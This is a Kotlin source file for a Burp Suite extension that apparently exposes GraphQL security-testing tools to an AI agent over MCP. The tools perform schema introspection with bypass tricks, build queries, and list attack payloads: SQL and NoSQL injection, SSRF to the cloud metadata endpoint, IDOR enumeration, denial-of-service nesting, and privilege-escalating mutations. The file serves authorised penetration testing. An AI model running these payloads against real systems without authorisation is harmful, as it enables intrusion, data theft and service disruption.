package net.portswigger.mcp.tools

import burp.api.montoya.MontoyaApi
import burp.api.montoya.http.HttpMode
import burp.api.montoya.http.HttpService
import burp.api.montoya.http.message.requests.HttpRequest
import io.modelcontextprotocol.kotlin.sdk.server.Server
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.*

private val json = Json {
    ignoreUnknownKeys = true
    prettyPrint = true
}

/**
 * Register GraphQL analysis and exploitation tools.
 */
fun Server.registerGraphqlTools(api: MontoyaApi) {

    mcpTool<GraphqlIntrospect>(
        "Perform GraphQL introspection to discover the schema. " +
        "Supports bypass techniques for servers that block introspection."
    ) {
        val service = HttpService.httpService(
            endpoint.substringAfter("://").substringBefore("/").substringBefore(":"),
            if (endpoint.startsWith("https")) 443 else 80,
            endpoint.startsWith("https")
        )

        val path = "/" + endpoint.substringAfter("://").substringAfter("/")

        val introspectionQuery = when (bypassTechnique) {
            "NEWLINE" -> """
                query IntrospectionQuery {
                  __schema
                  {
                    queryType { name }
                    mutationType { name }
                    subscriptionType { name }
                    types { ...FullType }
                    directives { name description locations args { ...InputValue } }
                  }
                }
                fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } }
                fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
                fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }
            """.trimIndent()

            "GET" -> null // Will use GET request

            "ALIASED" -> """
                query {
                  schema: __schema {
                    queryType { name }
                    mutationType { name }
                    types { name kind description fields { name } }
                  }
                }
            """.trimIndent()

            "FRAGMENTS" -> """
                query IntrospectionQuery {
                  __schema { ...SchemaFragment }
                }
                fragment SchemaFragment on __Schema {
                  queryType { name }
                  mutationType { name }
                  types { ...TypeFragment }
                }
                fragment TypeFragment on __Type {
                  name kind description
                  fields { name type { name kind } }
                }
            """.trimIndent()

            else -> FULL_INTROSPECTION_QUERY
        }

        val response = try {
            if (bypassTechnique == "GET") {
                // Use GET request with query parameter
                val encoded = java.net.URLEncoder.encode(FULL_INTROSPECTION_QUERY, "UTF-8")
                val request = HttpRequest.httpRequest(service, "GET $path?query=$encoded HTTP/1.1\r\nHost: ${service.host()}\r\n${formatHeaders(headers)}\r\n")
                api.http().sendRequest(request, HttpMode.HTTP_1)
            } else {
                val body = json.encodeToString(
                    buildJsonObject {
                        put("query", introspectionQuery)
                    }
                )

                val contentType = if (bypassTechnique == "NEWLINE") {
                    "application/json; charset=utf-8"
                } else {
                    "application/json"
                }

                val requestStr = buildString {
                    appendLine("POST $path HTTP/1.1")
                    appendLine("Host: ${service.host()}")
                    appendLine("Content-Type: $contentType")
                    appendLine("Content-Length: ${body.length}")
                    headers.forEach { (k, v) -> appendLine("$k: $v") }
                    appendLine()
                    append(body)
                }

                api.http().sendRequest(HttpRequest.httpRequest(service, requestStr.replace("\n", "\r\n")), HttpMode.HTTP_1)
            }
        } catch (e: Exception) {
            return@mcpTool "Request failed: ${e.message}"
        }

        val responseBody = response?.response()?.bodyToString() ?: return@mcpTool "No response received"

        try {
            val jsonResponse = json.parseToJsonElement(responseBody).jsonObject
            val data = jsonResponse["data"]?.jsonObject
            val errors = jsonResponse["errors"]?.jsonArray

            if (errors != null && errors.isNotEmpty()) {
                val errorMsg = errors.first().jsonObject["message"]?.jsonPrimitive?.content
                return@mcpTool buildString {
                    appendLine("=== Introspection Blocked ===")
                    appendLine()
                    appendLine("Error: $errorMsg")
                    appendLine()
                    appendLine("Try different bypass techniques:")
                    appendLine("  - NEWLINE: Add newline after __schema")
                    appendLine("  - GET: Use GET request instead of POST")
                    appendLine("  - ALIASED: Use aliased query")
                    appendLine("  - FRAGMENTS: Use fragments to obfuscate")
                }
            }

            val schema = data?.get("__schema")?.jsonObject
                ?: return@mcpTool "No schema data in response"

            buildString {
                appendLine("=== GraphQL Schema ===")
                appendLine()

                // Query type
                val queryType = schema["queryType"]?.jsonObject?.get("name")?.jsonPrimitive?.content
                appendLine("Query Type: $queryType")

                // Mutation type
                val mutationType = schema["mutationType"]?.jsonObject?.get("name")?.jsonPrimitive?.content
                if (mutationType != null) {
                    appendLine("Mutation Type: $mutationType")
                }

                // Types
                val types = schema["types"]?.jsonArray ?: return@mcpTool "No types found"

                appendLine()
                appendLine("Types (${types.size} total):")

                // Filter out built-in types
                val userTypes = types.filter {
                    val name = it.jsonObject["name"]?.jsonPrimitive?.content ?: ""
                    !name.startsWith("__")
                }

                userTypes.forEach { type ->
                    val typeObj = type.jsonObject
                    val name = typeObj["name"]?.jsonPrimitive?.content ?: "Unknown"
                    val kind = typeObj["kind"]?.jsonPrimitive?.content ?: ""
                    val desc = typeObj["description"]?.jsonPrimitive?.contentOrNull

                    appendLine()
                    appendLine("$kind $name")
                    if (desc != null) appendLine("  Description: $desc")

                    // Fields
                    typeObj["fields"]?.jsonArray?.forEach { field ->
                        val fieldObj = field.jsonObject
                        val fieldName = fieldObj["name"]?.jsonPrimitive?.content
                        val fieldType = formatGraphQLType(fieldObj["type"]?.jsonObject)
                        appendLine("  - $fieldName: $fieldType")

                        // Arguments
                        fieldObj["args"]?.jsonArray?.forEach { arg ->
                            val argObj = arg.jsonObject
                            val argName = argObj["name"]?.jsonPrimitive?.content
                            val argType = formatGraphQLType(argObj["type"]?.jsonObject)
                            appendLine("      arg $argName: $argType")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            "Failed to parse response: ${e.message}\n\nRaw response:\n${responseBody.take(1000)}"
        }
    }

    mcpTool<GraphqlBuildQuery>(
        "Build a GraphQL query from type and field specifications. " +
        "Helps construct valid queries after introspection."
    ) {
        buildString {
            val indent = "  "

            if (isMutation) {
                appendLine("mutation {")
            } else {
                appendLine("query {")
            }

            appendLine("$indent$operationName")

            if (arguments.isNotEmpty()) {
                append("$indent$indent(")
                append(arguments.entries.joinToString(", ") { (k, v) ->
                    if (v.startsWith("\"") || v.toIntOrNull() != null || v == "true" || v == "false") {
                        "$k: $v"
                    } else {
                        "$k: \"$v\""
                    }
                })
                appendLine(")")
            } else {
                appendLine()
            }

            appendLine("$indent$indent{")
            fields.forEach { field ->
                if (field.contains("{")) {
                    // Nested field
                    appendLine("$indent$indent$indent$field")
                } else {
                    appendLine("$indent$indent$indent$field")
                }
            }
            appendLine("$indent$indent}")

            appendLine("}")
        }
    }

    mcpTool<GraphqlSuggestPayloads>(
        "Suggest common GraphQL attack payloads based on the operation type. " +
        "Includes injection, authorization bypass, and information disclosure payloads."
    ) {
        buildString {
            appendLine("=== GraphQL Attack Payloads ===")
            appendLine()

            when (category.uppercase()) {
                "INJECTION" -> {
                    appendLine("SQL Injection via Arguments:")
                    appendLine("""  query { user(id: "1' OR '1'='1") { id email } }""")
                    appendLine("""  query { user(id: "1; DROP TABLE users--") { id } }""")
                    appendLine()
                    appendLine("NoSQL Injection:")
                    appendLine("""  query { user(filter: "{\"email\": {\"${"$"}ne\": \"\"}}") { id } }""")
                    appendLine()
                    appendLine("SSRF via URL Arguments:")
                    appendLine("""  query { fetchUrl(url: "http://169.254.169.254/latest/meta-data/") }""")
                }

                "IDOR", "AUTHORIZATION" -> {
                    appendLine("Direct Object Reference:")
                    appendLine("""  query { user(id: "1") { id email password } }""")
                    appendLine("""  query { user(id: "2") { id email adminNotes } }""")
                    appendLine()
                    appendLine("Batch Queries for Enumeration:")
                    appendLine("""  query {
    user1: user(id: "1") { email }
    user2: user(id: "2") { email }
    user3: user(id: "3") { email }
  }""")
                    appendLine()
                    appendLine("Field Stuffing:")
                    appendLine("""  query { user(id: "1") { id email role isAdmin secretKey } }""")
                }

                "DOS" -> {
                    appendLine("Deep Nested Queries:")
                    appendLine("""  query { users { friends { friends { friends { friends { id } } } } } }""")
                    appendLine()
                    appendLine("Circular References:")
                    appendLine("""  query { user(id: "1") { posts { author { posts { author { id } } } } } }""")
                    appendLine()
                    appendLine("Batching Attack:")
                    val batch = (1..100).joinToString("\n  ") { "q$it: __typename" }
                    appendLine("  query { $batch }")
                    appendLine()
                    appendLine("Field Duplication:")
                    appendLine("""  query { user(id: "1") { email email email email email } }""")
                }

                "INFO" -> {
                    appendLine("Field Suggestions (typos):")
                    appendLine("""  query { user(id: "1") { pasword } }  # May suggest 'password'""")
                    appendLine()
                    appendLine("Introspection Fragments:")
                    appendLine("""  query { __type(name: "User") { fields { name type { name } } } }""")
                    appendLine()
                    appendLine("Debug Fields:")
                    appendLine("""  query { user(id: "1") { id email __debug __sql __trace } }""")
                }

                "MUTATION" -> {
                    appendLine("Mass Assignment:")
                    appendLine("""  mutation { updateUser(id: "1", role: "admin", isAdmin: true) { id role } }""")
                    appendLine()
                    appendLine("Privilege Escalation:")
                    appendLine("""  mutation { createUser(email: "test@test.com", role: "admin") { id } }""")
                    appendLine()
                    appendLine("Parameter Pollution:")
                    appendLine("""  mutation { updateUser(id: "1", email: "attacker@evil.com", email: "victim@example.com") { id } }""")
                }

                else -> {
                    appendLine("Categories: INJECTION, IDOR, AUTHORIZATION, DOS, INFO, MUTATION")
                    appendLine()
                    appendLine("Run with specific category for targeted payloads.")
                }
            }
        }
    }
}

private fun formatHeaders(headers: Map<String, String>): String {
    return headers.entries.joinToString("\r\n") { "${it.key}: ${it.value}" }
}

private fun formatGraphQLType(typeObj: JsonObject?): String {
    if (typeObj == null) return "Unknown"

    val kind = typeObj["kind"]?.jsonPrimitive?.content
    val name = typeObj["name"]?.jsonPrimitive?.contentOrNull
    val ofType = typeObj["ofType"]?.jsonObject

    return when (kind) {
        "NON_NULL" -> "${formatGraphQLType(ofType)}!"
        "LIST" -> "[${formatGraphQLType(ofType)}]"
        else -> name ?: "Unknown"
    }
}

private const val FULL_INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
"""

// ============== Data Classes ==============

@Serializable
data class GraphqlIntrospect(
    val endpoint: String,
    val headers: Map<String, String> = emptyMap(),
    val bypassTechnique: String = "NONE"
)

@Serializable
data class GraphqlBuildQuery(
    val operationName: String,
    val fields: List<String>,
    val arguments: Map<String, String> = emptyMap(),
    val isMutation: Boolean = false
)

@Serializable
data class GraphqlSuggestPayloads(
    val category: String = "ALL"
)
